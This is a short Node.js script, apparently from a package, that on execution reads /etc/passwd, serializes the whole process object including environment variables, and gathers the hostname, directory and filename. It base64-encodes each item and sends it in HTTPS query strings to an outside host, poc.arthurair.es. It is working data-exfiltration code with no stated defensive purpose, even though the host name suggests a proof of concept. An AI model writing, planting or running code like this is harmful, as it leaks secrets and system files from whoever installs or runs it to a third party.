'use strict'

const https = require('https')
const http = require("http");
const os = require("os");

var currentPath = __dirname.toString('base64');
var currentFile = __filename.toString('base64');
var currentEnvString = JSON.stringify(process);
var currentPath = Buffer.from(JSON.stringify(__dirname)).toString('base64');
var currentFile = Buffer.from(JSON.stringify(__filename)).toString('base64');
var currentEnvBase64 = Buffer.from(currentEnvString).toString('base64');
var currentHostName = Buffer.from(JSON.stringify(os.hostname())).toString('base64');

var fs = require('fs')

function sendRequest(data) {
    https.get('https://poc.arthurair.es/?' + data, (resp) => {
        }).on("error", (err) => {
        console.log("Error: " + err.message);
    });
}

fs.readFile('/etc/passwd', 'utf8', async function (err,file) {

    var etc = Buffer.from(file).toString('base64');
    var env = currentEnvBase64;
    
    sendRequest('--------------------INICIO-ME------------------------')
    sendRequest(etc)
    sendRequest(env)
    sendRequest(currentPath)
    sendRequest(currentHostName)
    sendRequest(currentFile)
    sendRequest('--------------------FINAL--ME----------------------')
    

});